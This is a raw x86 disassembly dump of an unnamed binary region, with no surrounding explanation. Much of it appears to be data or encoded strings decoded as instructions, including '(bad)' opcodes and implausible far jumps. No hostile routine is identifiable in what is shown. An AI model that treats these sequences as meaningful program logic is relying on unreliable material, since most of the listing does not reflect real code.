  413aad:	dec    edi
  413aae:	ins    BYTE PTR es:[edi],dx
  413aaf:	dec    edi
  413ab0:	cmp    cl,BYTE PTR [edi+0x4e]
  413ab3:	dec    edi
  413ab4:	cmp    DWORD PTR [edi+0x6b],ecx
  413ab7:	dec    edi
  413ab8:	cmp    eax,0x304f484f
  413abd:	dec    edi
  413abe:	cmp    cl,BYTE PTR [edi+0x36]
  413ac1:	dec    edi
  413ac2:	push   ds
  413ac3:	rcr    BYTE PTR [edi],cl
  413ac5:	ror    DWORD PTR [edi],cl
  413ac7:	jecxz  0x413ad5
  413ac9:	loopne 0x413b47
  413acb:	lock jge 0x413abf
  413ace:	aas    
  413acf:	dec    edi
  413ad0:	imul   ecx,DWORD PTR [edi+0x3a],0x394f5f4f
  413ad7:	dec    edi
  413ad8:	dec    edx
  413ad9:	dec    edi
  413ada:	ds dec edi
  413adc:	cmp    cl,BYTE PTR [edi+0x3f]
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	loop   0x413b02
  413ae3:	jecxz  0x413af4
  413ae5:	repz or al,0xf0
  413ae8:	jl     0x413aea
  413aea:	jge    0x413aed
  413aec:	jl     0x413afe
  413aee:	jge    0x413b01
  413af0:	ds dec edi
  413af2:	jg     0x413b43
  413af4:	cmp    cl,BYTE PTR [edi+0x53]
  413af7:	dec    edi
  413af8:	cmp    BYTE PTR [edi+0x6a],cl
  413afb:	dec    edi
  413afc:	ds dec edi
  413afe:	dec    ecx
  413aff:	dec    edi
  413b00:	xor    ecx,DWORD PTR [edi+0x3a]
  413b03:	dec    edi
  413b04:	xor    DWORD PTR [edi+0x1e],ecx
  413b07:	add    bl,BYTE PTR [edi]
  413b09:	add    ecx,DWORD PTR [edi]
  413b0b:	adc    ecx,DWORD PTR [eax+edx*1]
  413b0e:	jl     0x413b30
  413b10:	jge    0x413b33
  413b12:	aas    
  413b13:	dec    edi
  413b14:	add    BYTE PTR [eax],al
  413b16:	sahf   
  413b17:	cmp    DWORD PTR [ecx+0x0],eax
  413b1a:	xchg   edx,eax
  413b1b:	cmp    eax,DWORD PTR [ecx+0x0]
  413b1e:	call   0x413d:0xea00413b
  413b25:	add    BYTE PTR [esi+0x3d],cl
  413b28:	inc    ecx
  413b29:	add    dl,bl
  413b2b:	cmp    eax,0x3b7a0041
  413b30:	inc    ecx
  413b31:	add    BYTE PTR [esi+0x3b],bh
  413b34:	inc    ecx
  413b35:	add    dl,dl
  413b37:	cmp    eax,0x3be20041
  413b3c:	inc    ecx
  413b3d:	add    BYTE PTR [ecx+ebp*4-0x454a0764],cl
  413b44:	pushf  
  413b45:	clc    
  413b46:	xchg   esi,eax
  413b47:	cmp    eax,DWORD PTR [ecx+0x0]
  413b4a:	or     bh,BYTE PTR ds:0x3d1e0041
  413b50:	inc    ecx
  413b51:	add    BYTE PTR [edx],ch
  413b53:	cmp    eax,0x3d3a0041
  413b58:	inc    ecx
  413b59:	add    dh,cl
  413b5b:	cmp    eax,DWORD PTR [ecx+0x0]
  413b5e:	call   0x413b:0xee004139
  413b65:	add    dh,bl
  413b67:	cmp    eax,DWORD PTR [ecx+0x0]
  413b6a:	out    dx,al
  413b6b:	cmp    eax,0x85350041
  413b70:	pushf  
  413b71:	clc    
  413b72:	cwde   
  413b73:	or     edx,DWORD PTR [edi]
  413b75:	and    DWORD PTR [edx-0x64ffbec5],0x8f81161c
  413b7f:	or     eax,0x705
  413b84:	inc    eax
  413b85:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413b89:	fnstsw WORD PTR [ebx]
  413b8b:	xor    eax,0x68720043
  413b90:	inc    ebp
  413b91:	inc    ecx
  413b92:	(bad)  
  413b93:	cli    
  413b94:	jne    0x413bf8
  413b96:	(bad)  
  413b97:	in     eax,dx
  413b98:	inc    BYTE PTR [edi]
  413b9a:	mov    esi,0x8a05a3fa
  413b9f:	cmp    eax,DWORD PTR [ecx+0x0]
  413ba2:	xor    al,0x95
  413ba4:	pushf  
  413ba5:	clc    
  413ba6:	xor    al,0x96
  413ba8:	pushf  
  413ba9:	clc    
  413baa:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  413bb0:	pushf  
  413bb1:	clc    
  413bb2:	cmp    DWORD PTR [ebp-0x6ac70764],edx
  413bb8:	pushf  
  413bb9:	clc    
  413bba:	aas    
  413bbb:	xchg   ebp,eax
  413bbc:	pushf  
  413bbd:	clc    
  413bbe:	ds xchg ebp,eax
  413bc0:	pushf  
  413bc1:	clc    
  413bc2:	cmp    eax,0x3cf89c95
  413bc7:	xchg   ebp,eax
  413bc8:	pushf  
  413bc9:	clc    
  413bca:	and    eax,0xe9f89c95
  413bcf:	stc    
  413bd0:	add    esp,DWORD PTR [eax-0x6e]
  413bd3:	cmp    DWORD PTR [ecx+0x0],eax
  413bd6:	push   ss
  413bd7:	add    BYTE PTR [ebx+0x0],al
  413bda:	pop    ecx
  413bdb:	dec    ecx
  413bdc:	imul   si,WORD PTR ds:0x98f89c85,0xffe9
  413be4:	push   eax
  413be5:	pop    es
  413be6:	arpl   WORD PTR [edx],cx
  413be8:	add    BYTE PTR [eax],al
  413bea:	mov    ?,WORD PTR [ecx]
  413bec:	inc    ecx
  413bed:	add    BYTE PTR [edx+0xe040b],bl
	...
  413c23:	adc    BYTE PTR [eax+0x0],al
  413c26:	cmp    dl,BYTE PTR [eax]
  413c28:	inc    ebx
  413c29:	add    BYTE PTR [eax],al
  413c2b:	add    BYTE PTR [eax],al
  413c2d:	add    BYTE PTR [eax+eax*1+0x46],al
  413c31:	add    BYTE PTR [ecx+0x0],ch
  413c34:	outs   dx,DWORD PTR ds:[esi]
  413c35:	add    BYTE PTR [edx+0x0],cl
  413c38:	dec    ecx
  413c39:	add    BYTE PTR [eax+eax*1+0x46],al
  413c3d:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c41:	add    BYTE PTR [ebp+0x0],dl
  413c44:	inc    esi
  413c45:	add    BYTE PTR [edi+0x0],cl
  413c48:	imul   eax,DWORD PTR [eax],0x6f
  413c4b:	add    BYTE PTR [edx+0x0],ch
  413c4e:	dec    ebx
  413c4f:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c53:	add    BYTE PTR [edx+0x0],ch
  413c56:	imul   eax,DWORD PTR [eax],0x46006f
  413c5c:	jo     0x413c5e
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	add    BYTE PTR [ebx+0x0],ch
  413c62:	ins    DWORD PTR es:[edi],dx
  413c63:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c67:	add    BYTE PTR [ebx+0x0],dh
  413c6a:	ins    BYTE PTR es:[edi],dx
  413c6b:	add    BYTE PTR [edx+0x0],ch
  413c6e:	data16 add BYTE PTR [edi+0x0],ah
  413c72:	imul   eax,DWORD PTR [eax],0x64006f
  413c78:	add    BYTE PTR [di+0x0],dh
  413c7c:	imul   eax,DWORD PTR [eax],0x69006a
  413c82:	outs   dx,DWORD PTR ds:[esi]
  413c83:	add    BYTE PTR [esi+0x0],ah
  413c86:	add    BYTE PTR fs:[ebp+0x0],dh
  413c8a:	push   0x0
  413c8c:	add    BYTE PTR [bp+0x0],ah
  413c90:	add    BYTE PTR fs:[eax],al
  413c93:	add    BYTE PTR [eax],al
  413c95:	add    BYTE PTR [ebx+ebp*2+0x6c],al
  413c99:	fs data16 jae 0x413cfe
  413c9d:	push   0x6f
  413c9f:	imul   esp,DWORD PTR [esi+0x64],0x73
  413ca3:	imul   esp,DWORD PTR [esi+0x67],0x6a
  413ca7:	fs addr16 fs pushw 0x6867
  413cae:	addr16 pushw 0x6667
  413cb3:	push   0x6667
  413cb8:	add    BYTE PTR [eax],al
  413cba:	add    BYTE PTR [eax],al
  413cbc:	add    BYTE PTR [eax],al
  413cbe:	dec    ebx
  413cbf:	dec    edx
  413cc0:	dec    edx
  413cc1:	dec    ebx
  413cc2:	inc    esp
  413cc3:	inc    esi
  413cc4:	push   0x6b
  413cc6:	ins    BYTE PTR es:[edi],dx
  413cc7:	dec    esp
  413cc8:	cmp    al,BYTE PTR [esi+eax*2+0x49]
  413ccc:	imul   ebp,DWORD PTR [edi+0x64],0x6b66696a
  413cd3:	fs jae 0x413d45
  413cd6:	imul   esp,DWORD PTR [edi+0x66],0x6f696469
  413cdd:	push   0x69
  413cdf:	outs   dx,DWORD PTR ds:[esi]
  413ce0:	dec    edx
  413ce1:	dec    edi
  413ce2:	inc    esp
  413ce3:	inc    esi
  413ce4:	ins    BYTE PTR es:[edi],dx
  413ce5:	imul   ebp,DWORD PTR [edx+0x66],0x6f
  413ce9:	imul   esp,DWORD PTR [ebx+esi*2+0x67],0x73666a6f
  413cf1:	imul   ebp,DWORD PTR fs:[si+0x66],0x64
  413cf7:	push   0x643b6c67
  413cfc:	push   0x6667
  413d01:	add    BYTE PTR [eax],al
  413d03:	add    BYTE PTR [eax],al
  413d05:	add    BYTE PTR [ebp+0x51004100],dh
  413d0b:	dec    edi
  413d0c:	pop    edi
  413d0d:	dec    edi
  413d0e:	dec    eax
  413d0f:	dec    edi
  413d10:	push   esp
  413d11:	dec    edi
  413d12:	pop    edi
  413d13:	dec    edi
  413d14:	push   esi
  413d15:	dec    edi
  413d16:	or     DWORD PTR [edi+0x8],ecx
  413d19:	dec    edi
  413d1a:	cmp    cl,BYTE PTR [edi+0x0]
  413d1d:	add    BYTE PTR [ebp+0x4f],bl
  413d20:	pop    esi
  413d21:	dec    edi
  413d22:	push   ebx
  413d23:	dec    edi
  413d24:	or     DWORD PTR [edi+0x8],ecx
  413d27:	dec    edi
  413d28:	cmp    cl,BYTE PTR [edi+0x4f]
  413d2b:	dec    edi
  413d2c:	dec    ecx
  413d2d:	dec    edi
  413d2e:	pop    edi
  413d2f:	dec    edi
  413d30:	dec    eax
  413d31:	dec    edi
  413d32:	or     DWORD PTR [edi+0x8],ecx
  413d35:	dec    edi
  413d36:	cmp    cl,BYTE PTR [edi+0x0]
  413d39:	add    BYTE PTR [ecx+0x4f],cl
  413d3c:	push   edx
  413d3d:	dec    edi
  413d3e:	push   esi
  413d3f:	dec    edi
  413d40:	dec    ebp
  413d41:	dec    edi
  413d42:	pop    ebx
  413d43:	dec    edi
  413d44:	dec    edx
  413d45:	dec    edi
  413d46:	push   ebx
  413d47:	dec    edi
  413d48:	cmp    cl,BYTE PTR [edi+0x0]
  413d4b:	add    BYTE PTR [eax],al
  413d4d:	add    BYTE PTR [esi+0x7d],ch
  413d50:	outs   dx,BYTE PTR ds:[esi]
  413d51:	lea    ebp,[esi-0x63]
  413d54:	outs   dx,BYTE PTR ds:[esi]
  413d55:	lods   eax,DWORD PTR ds:[esi]
  413d56:	outs   dx,BYTE PTR ds:[esi]
  413d57:	mov    ebp,0xdd6ecd6e
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	in     eax,dx
  413d5e:	outs   dx,BYTE PTR ds:[esi]
  413d5f:	std    
  413d60:	outs   dx,BYTE PTR ds:[esi]
  413d61:	or     eax,0x2d6e1d6e
  413d66:	outs   dx,BYTE PTR ds:[esi]
  413d67:	cmp    eax,0x6d6e5d6e
  413d6c:	outs   dx,BYTE PTR ds:[esi]
  413d6d:	jb     0x413ddd
  413d6f:	jae    0x413ddf
  413d71:	jo     0x413de1
  413d73:	jno    0x413de3
  413d75:	jbe    0x413de5
  413d77:	ja     0x413de7
  413d79:	je     0x413de9
  413d7b:	jne    0x413deb
  413d7d:	mov    ch,BYTE PTR [esi-0x75]
  413d80:	outs   dx,BYTE PTR ds:[esi]
  413d81:	mov    BYTE PTR [esi-0x77],ch
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    gs,WORD PTR [esi+0x7c]
  413d88:	pop    esi
  413d89:	jge    0x413dd9
  413d8b:	jge    0x413d4b
  413d8d:	jge    0x413deb
  413d8f:	(bad)  
  413d90:	jge    0x413e02
  413d92:	mov    ebp,0x79736eb1
  413d97:	bound  esp,QWORD PTR [edx+0x78265fc6]
  413d9d:	add    BYTE PTR [ebp+0x17],cl
  413da0:	mov    bl,0x56
  413da2:	mov    ebp,0x423742f4
  413da7:	jle    0x413d46
  413da9:	jno    0x413e0f
  413dab:	mov    cl,0x0
  413dad:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d0],0x40
  413db5:	xlat   BYTE PTR ds:[ebx]
  413db6:	aad    0x93
  413db8:	dec    esp
  413db9:	adc    esp,edx
  413dbb:	jge    0x413d88
  413dbd:	faddp  st(7),st
  413dbf:	leave  
  413dc0:	xchg   BYTE PTR [esi+0x1fa23214],ah
  413dc6:	pusha  
  413dc7:	icebp  
  413dc8:	push   esp
  413dc9:	(bad)  
  413dca:	aad    0x18
  413dcc:	aad    0x71
  413dce:	add    BYTE PTR [eax],al
  413dd0:	add    BYTE PTR [eax],al
  413dd2:	out    dx,eax
  413dd3:	(bad)  [ebx+0x7]
  413dd6:	jmp    0xc02f:0x4500413b
  413ddd:	and    bh,BYTE PTR [ecx+eiz*1+0x41]
  413de1:	add    BYTE PTR [esi+0x53],al
  413de4:	outs   dx,DWORD PTR ds:[esi]
  413de5:	push   ebx
  413de6:	cmp    BYTE PTR [ebx],0x41
  413de9:	add    dh,ah
  413deb:	cmp    eax,DWORD PTR [ecx+0x0]
  413dee:	(bad)  
  413def:	in     eax,dx
  413df0:	adc    al,BYTE PTR [edi]
	...
  413e12:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e19:	pop    ecx
  413e1a:	outs   dx,BYTE PTR ds:[esi]
  413e1b:	jbe    0x413e95
  413e1d:	jns    0x413e73
  413e1f:	push   ecx
  413e20:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  413e24:	je     0x413e87
  413e26:	inc    ebx
  413e27:	jo     0x413e9b
  413e29:	data16 jp 0x413e7e
  413e2c:	jp     0x413e86
  413e2e:	ins    BYTE PTR es:[edi],dx
  413e2f:	je     0x413ea0
  413e31:	jns    0x413ea1
  413e33:	popa   
  413e34:	push   esi
  413e35:	push   ebp
  413e36:	push   0x564476
	...
  413e4b:	add    BYTE PTR [eax],al
  413e4d:	add    BYTE PTR [eax+ecx*2+0x74],dl
  413e51:	dec    esp
  413e52:	push   ebx
  413e53:	jne    0x413ec0
  413e55:	popa   
  413e56:	jp     0x413eac
  413e58:	arpl   WORD PTR [ecx+0x4b],cx
  413e5b:	push   edx
  413e5c:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  413e63:	push   0x66495949
  413e68:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413e6c:	push   esi
  413e6d:	jb     0x413ed7
  413e6f:	add    BYTE PTR [ebx+0x51],al
  413e72:	ins    BYTE PTR es:[edi],dx
  413e73:	pop    eax
  413e74:	ja     0x413ec3
  413e76:	je     0x413eee
  413e78:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  413e7c:	jb     0x413ef7
  413e7e:	inc    edi
  413e7f:	push   edi
  413e80:	push   esi
  413e81:	inc    edi
  413e82:	ins    BYTE PTR es:[edi],dx
  413e83:	inc    ecx
  413e84:	inc    edi
  413e85:	jae    0x413e87
  413e87:	add    BYTE PTR [edi+0x4a],dl
  413e8a:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413e91:	popa   
  413e92:	push   edi
  413e93:	push   esi
  413e94:	add    BYTE PTR [eax],al
  413e96:	in     al,0xf5
  413e98:	jnp    0x413ee8
  413e9a:	jnp    0x413e6a
  413e9c:	cmc    
  413e9d:	(bad)  
  413e9e:	fcomp  DWORD PTR [esi+0x644b5414]
  413ea4:	cmp    al,0x6e
  413ea6:	in     eax,dx
  413ea7:	into   
  413ea8:	add    BYTE PTR [eax],al
  413eaa:	pop    es
  413eab:	add    DWORD PTR [eax],eax
  413ead:	add    ah,al
  413eaf:	xchg   esp,eax
  413eb0:	dec    ebp
  413eb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413eb2:	mov    eax,0xa30b5eab
  413eb7:	jb     0x413e51
  413eb9:	pop    ebx
  413eba:	adc    BYTE PTR [edi-0x76],al
  413ebd:	fimul  DWORD PTR [edx+eiz*1-0x5c]
  413ec1:	jb     0x413efb
  413ec3:	mov    al,0x1e
  413ec5:	bound  esi,QWORD PTR [esi+0x15]
  413ec8:	xchg   ebx,eax
  413ec9:	sub    al,0x94
  413ecb:	sbb    edx,DWORD PTR [edx+0x20c383f7]
  413ed1:	sbb    eax,0xefcf4159
  413ed6:	mov    al,ds:0xe4f70e28
  413edb:	pop    ds
  413edc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413edd:	jne    0x413f18
  413edf:	cwde   
  413ee0:	not    DWORD PTR [eax+0x4a]
  413ee3:	out    dx,eax
  413ee4:	xchg   ebx,eax
  413ee5:	mov    ebx,esi
  413ee7:	bound  edx,QWORD PTR [edi]
  413ee9:	add    DWORD PTR [ebx],ecx
  413eeb:	dec    esp
  413eec:	imul   ebx,DWORD PTR [ebp-0x25ddab0],0x5898be17
  413ef6:	mov    DWORD PTR [edx+0x3860034],ecx
  413efc:	jns    0x413eb8
  413efe:	(bad)  
  413eff:	mov    edx,0x3f9ff1a1
  413f04:	adc    edx,esp
  413f06:	les    ecx,FWORD PTR [esi-0x1ac5046b]
  413f0c:	sbb    al,BYTE PTR [esi+0x6dc1b2ae]
  413f12:	add    al,0xd8
  413f14:	dec    ebx
  413f15:	add    eax,0xdd0f01ec
  413f1a:	fs xchg ebp,eax
  413f1c:	retf   
  413f1d:	mov    eax,0xbbda5f76
  413f22:	push   ecx
  413f23:	cmp    bl,BYTE PTR [ebx+0x5268f1bc]
  413f29:	mov    ch,BYTE PTR [ebp+0x38fecb9]
  413f2f:	out    dx,al
  413f30:	pop    edi
  413f31:	xor    eax,0xa34757eb
  413f36:	xchg   BYTE PTR [ecx],cl
  413f38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f39:	mov    ecx,0x2fa806e5
  413f3e:	mov    cs,WORD PTR [eax-0x52]
  413f41:	and    ecx,DWORD PTR [ecx+0x2d3e6dae]
  413f47:	int    0xed
  413f49:	push   0x34
  413f4b:	out    0x60,eax
  413f4d:	jmp    0x340c:0x167accfa
  413f54:	cmp    al,0x43
  413f56:	ret    
  413f57:	iret   
  413f58:	dec    esi
  413f59:	jae    0x413f46
  413f5b:	jno    0x413fa4
  413f5d:	inc    eax
  413f5e:	mov    ebx,0xdce50ac0
  413f63:	cwde   
  413f64:	pop    ds
  413f65:	jne    0x413fa6
  413f67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f68:	mov    ebp,0xf7f482fd
  413f6d:	mov    ecx,0x767ae48f
  413f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f73:	iret   
  413f74:	adc    ch,BYTE PTR [ebx+0x8]
  413f77:	mov    ebx,0xc374a925
  413f7c:	dec    ecx
  413f7d:	pop    eax
  413f7e:	inc    ebp
  413f7f:	pop    ebp
  413f80:	in     al,dx
  413f81:	mov    ds:0x76396ff,al
  413f86:	iret   
  413f87:	fwait
  413f88:	jmp    0xe99d:0x2e585181
  413f8f:	sbb    ebp,DWORD PTR [eax-0x2e]
  413f92:	or     DWORD PTR [eax],edi
  413f94:	pushf  
  413f95:	push   edx
  413f96:	xor    al,0x39
  413f98:	mov    ecx,0xaaf8d8c8
  413f9d:	sub    eax,0x7de5b2a8
  413fa2:	mov    eax,ds:0xdd16b356
  413fa7:	scas   eax,DWORD PTR es:[edi]
  413fa8:	nop
  413fa9:	dec    ebp
  413faa:	pushf  
  413fab:	retf   
  413fac:	dec    ecx
  413fad:	mov    edi,0x955438e9
  413fb2:	lods   al,BYTE PTR ds:[esi]
  413fb3:	and    DWORD PTR [ecx],esi
	...
  414015:	add    BYTE PTR [edx-0x26],bl
  414018:	push   esi
  414019:	pusha  
  41401a:	(bad)  
  41401b:	in     al,dx
  41401c:	jle    0x414018
  41401e:	mov    ch,0x80
  414020:	cmp    eax,0xf3b57ff9
  414025:	mov    esp,esi
  414027:	iret   
  414028:	add    BYTE PTR [eax],al
  41402a:	pop    es
  41402b:	add    DWORD PTR [eax],eax
  41402d:	add    BYTE PTR [edx],cl
  41402f:	mov    bl,0xde
  414031:	adc    BYTE PTR [ebx-0x169e84d8],bh
  414037:	into   
  414038:	ror    DWORD PTR [edi+0x43],0xdf
  41403c:	stos   DWORD PTR es:[edi],eax
  41403d:	arpl   cx,ax
  41403f:	rcr    esp,1
  414041:	cmp    al,0x42
  414043:	ins    BYTE PTR es:[edi],dx
  414044:	jmp    0x2a87:0xe0e75964
  41404b:	xor    ah,dh
  41404d:	(bad)  
  41404f:	adc    eax,0xe894fe82
  414054:	mov    cl,0xe3
  414056:	loope  0x414074
  414058:	outs   dx,DWORD PTR ds:[esi]
  414059:	xor    eax,0xb95e8b1a
  41405e:	xor    al,0x80
  414060:	and    eax,0xef3171ca
  414065:	mov    esp,0xc1237ae9
  41406a:	loopne 0x41406a
  41406c:	sub    DWORD PTR [edi],ebx
  41406e:	addr16 mov edx,0x28e2d951
  414074:	test   BYTE PTR [ecx],0x89
  414077:	loopne 0x4140c0
  414079:	loop   0x4140d2
  41407b:	or     DWORD PTR ss:[ecx],edi
  41407e:	cmp    dl,al
  414080:	push   ebp
  414081:	data16 fst DWORD PTR [eax]
  414084:	repz push edi
  414086:	fcom   QWORD PTR [ebx-0x2f]
  414089:	mov    al,0xc0
  41408b:	mov    ds:0x346a7d5,eax
  414090:	in     al,0x47
  414092:	pusha  
  414093:	ret    0x2ec9
  414096:	mov    al,0x47
  414098:	mov    ebp,0x798a768f
  41409d:	out    0xed,al
  41409f:	(bad)  
  4140a1:	jno    0x41410f
  4140a3:	pop    edx
  4140a4:	sub    DWORD PTR [ebx+0x85580b0],edi
  4140aa:	out    0x33,al
  4140ac:	pop    ds
  4140ad:	aam    0xec
  4140af:	imul   ebp,DWORD PTR [edi-0x4b],0x3e527c09
  4140b6:	sub    al,0x37
  4140b8:	jae    0x414053
  4140ba:	ret    0x9078
  4140bd:	cwde   
  4140be:	mov    eax,0x75c6a531
  4140c3:	jge    0x4140e7
  4140c5:	shl    DWORD PTR [ebp+0x64],cl
  4140c8:	pop    edx
  4140c9:	xchg   ebx,eax
  4140ca:	call   0xed3596de
  4140cf:	add    ebp,DWORD PTR [ecx]
  4140d1:	dec    ecx
  4140d2:	xchg   edx,eax
  4140d3:	ret    
  4140d4:	fwait
  4140d5:	push   0x75
  4140d7:	sub    ebp,esp
  4140d9:	mov    dl,0x4
  4140db:	and    dl,al
  4140dd:	push   esp
  4140de:	or     bl,0xc6
  4140e1:	sub    al,0xe7
  4140e3:	das    
  4140e4:	test   DWORD PTR [ebx+0xc],0xc86e7cd6
  4140eb:	in     eax,0x90
  4140ed:	push   esp
  4140ee:	fwait
  4140ef:	sub    cl,BYTE PTR ds:0xe57e1b19
  4140f5:	jb     0x4140f1
  4140f7:	call   0x1182:0xe6a3ca7a
  4140fe:	(bad)  
  4140ff:	int    0x2e
  414101:	addr16 in al,dx
  414103:	das    
  414104:	bound  esi,QWORD PTR [esi-0x20878cb2]
  41410a:	jecxz  0x4140c3
  41410c:	jmp    0x26187764
  414111:	call   0x7121:0xe4ccc9cc
  414118:	and    dh,dl
  41411a:	or     DWORD PTR [esi],0x1188fff
  414120:	xor    eax,DWORD PTR [ecx-0x7a9c72c1]
  414126:	sbb    eax,0x2e668c14
  41412b:	pop    edx
  41412c:	dec    ecx
  41412d:	sar    BYTE PTR [ebp+0x62e3a8fe],1
  414133:	sbb    al,0x71
	...
  414195:	add    BYTE PTR [edx],al
  414197:	adc    al,BYTE PTR [ecx]
  414199:	mov    ds:0xb3a2b311,eax
  41419e:	push   0xffffffdd
  4141a0:	add    eax,0xfc6f8fb4
  4141a5:	inc    ecx
  4141a6:	sti    
  4141a7:	rol    BYTE PTR [eax],1
  4141a9:	add    BYTE PTR [edi],al
  4141ab:	add    DWORD PTR [eax],eax
  4141ad:	add    BYTE PTR [ecx+ecx*1-0x519a195],bh
  4141b4:	lds    eax,FWORD PTR [esi-0x67]
  4141b7:	push   ss
  4141b8:	cmp    eax,0x6c0a188a
  4141bd:	and    DWORD PTR [eax+0x4b],eax
  4141c0:	aam    0x58
  4141c2:	dec    ebp
  4141c3:	push   esp
  4141c4:	loop   0x41418c
  4141c6:	dec    eax
  4141c7:	out    dx,eax
  4141c8:	or     dl,BYTE PTR [edi]
  4141ca:	mov    al,BYTE PTR [edx+0x2bc403ba]
  4141d0:	dec    eax
  4141d1:	inc    eax
  4141d2:	sbb    al,0x9
  4141d4:	int3   
  4141d5:	ja     0x4141ee
  4141d7:	popa   
  4141d8:	fmul   QWORD PTR [edi+0x41]
  4141db:	and    eax,0xeb3458ab
  4141e0:	mov    esi,0x33f42c99
  4141e5:	aas    
  4141e6:	clc    
  4141e7:	(bad)  
  4141e8:	adc    al,0x77
  4141ea:	jns    0x414179
  4141ec:	outs   dx,DWORD PTR ds:[esi]
  4141ed:	fstp   QWORD PTR [ecx+0x5862294a]
  4141f3:	adc    esp,edi
  4141f5:	xchg   edi,eax
  4141f6:	test   dl,ah
  4141f8:	or     eax,DWORD PTR [ebp-0x15]
  4141fb:	mov    ch,0x39
  4141fd:	outs   dx,BYTE PTR ds:[esi]
  4141fe:	ret    
  4141ff:	add    BYTE PTR [edx+0x33ffa461],dl
  414205:	cdq    
  414206:	jp     0x414198
  414208:	mov    bl,0x53
  41420a:	ror    DWORD PTR [esi+eax*1-0x1b],1
  41420e:	ret    
  41420f:	sbb    bl,BYTE PTR [esi]
  414211:	aad    0xb5
  414213:	in     al,dx
  414214:	stos   BYTE PTR es:[edi],al
  414215:	mov    dl,0xdf
  414217:	bswap  edi
  414219:	xor    dl,bl
  41421b:	sub    DWORD PTR ds:0xa50d9554,ebp
  414221:	push   edx
  414222:	aaa    
  414223:	mov    BYTE PTR [ecx+esi*2+0x1c],bl
  414227:	jmp    0x84fe:0xb3f47764
  41422e:	pop    esp
  41422f:	lahf   
  414230:	inc    BYTE PTR [eax-0x6]
  414233:	arpl   WORD PTR [edx-0x2f26257b],cx
  414239:	adc    bh,dl
  41423b:	pop    eax
  41423c:	sbb    al,dl
  41423e:	pop    ebx
  41423f:	add    eax,0xb6d64f11
  414244:	(bad)  
  414245:	cmp    al,bh
  414247:	ret    0x13c0
  41424a:	dec    ebx
  41424b:	jne    0x414201
  41424d:	pop    es
  41424e:	bound  ebp,QWORD PTR [eax-0x21b5d4e7]
  414254:	call   0xdca34232
  414259:	retf   
  41425a:	loope  0x414261
  41425c:	popf   
  41425d:	cli    
  41425e:	sbb    BYTE PTR [ebp+eax*1+0x7d],dh
  414262:	clc    
  414263:	ret    
  414264:	jns    0x414298
  414266:	sahf   
  414267:	sub    eax,0x9ac762c7
  41426c:	div    DWORD PTR [ebx-0x11]
  41426f:	fnstsw WORD PTR [eax+0x55]
  414272:	sub    DWORD PTR [edi-0x2b15bf94],0x58
  414279:	sub    dl,BYTE PTR [eax-0x76]
  41427c:	ror    BYTE PTR [edi],1
  41427e:	mov    BYTE PTR [ebp+0x1fdec3a0],bh
  414284:	dec    ecx
  414285:	xchg   ecx,eax
  414286:	push   0xf505fcd9
  41428b:	jb     0x41424d
  41428d:	in     al,dx
  41428e:	gs push ds
  414290:	cmpps  xmm0,XMMWORD PTR [esi+0x6b4e97be],0xae
  414298:	push   edi
  414299:	sub    eax,0x8e973a6d
  41429e:	inc    edx
  41429f:	hlt    
  4142a0:	xchg   DWORD PTR [ebp+0x71],edi
  4142a3:	sbb    al,0x85
  4142a5:	and    al,0xa2
  4142a7:	cmp    DWORD PTR [ebp-0x65],esi
  4142aa:	pop    ds
  4142ab:	pop    eax
  4142ac:	test   BYTE PTR [esi+0x62bc30a9],0x6a
  4142b3:	sbb    dh,BYTE PTR [edx]
	...
  414315:	add    BYTE PTR [ecx],al
  414317:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41431e:	idiv   BYTE PTR [esi-0x64]
  414321:	mov    ebx,0xa61423a1
  414326:	add    dl,dl
  414328:	add    BYTE PTR [eax],al
  41432a:	pop    es
  41432b:	add    DWORD PTR [eax],eax
  41432d:	add    BYTE PTR [edi-0x157b8762],cl
  414333:	add    DWORD PTR [ebp+0x51],eax
  414336:	(bad)  
  414337:	fs inc eax
  414339:	test   BYTE PTR [ebx-0xfd21a4c],dh
  41433f:	sbb    BYTE PTR [eax-0x785a9072],bh
  414345:	popf   
  414346:	and    DWORD PTR [ecx+esi*4+0xd19068b],ebp
  41434d:	dec    edx
  41434e:	jae    0x414300
  414350:	mov    edi,0xcd5c6235
  414355:	imul   ebx,DWORD PTR [eax+esi*8],0x270e58e9
  41435c:	aam    0xc
  41435e:	sar    BYTE PTR [edx],0x4a
  414361:	xchg   ebx,eax
  414362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414363:	mov    es,ebp
  414365:	mov    ds:0x927f022f,al
  41436a:	mov    ecx,DWORD PTR [ecx-0x73]
  41436d:	fiadd  DWORD PTR [edi]
  41436f:	jge    0x4143a5
  414371:	ret    0x6d4e
  414374:	sahf   
  414375:	fild   QWORD PTR [eax]
  414377:	xor    esi,edx
  414379:	xlat   BYTE PTR ds:[ebx]
  41437a:	test   BYTE PTR [ebp-0x4b],bl
  41437d:	fld    TBYTE PTR [ecx]
  41437f:	mov    WORD PTR [edx],es
  414381:	jl     0x4143f5
  414383:	pop    ds
  414384:	fiadd  WORD PTR [ecx]
  414386:	pushf  
  414387:	rcl    DWORD PTR [ebx],cl
  414389:	xor    al,0xb
  41438b:	mov    dl,0xc7
  41438d:	add    BYTE PTR [ecx+0x291873a3],0xa4
  414394:	pop    eax
  414395:	mov    WORD PTR [ebp+esi*4+0x26],?
  414399:	loope  0x4143a9
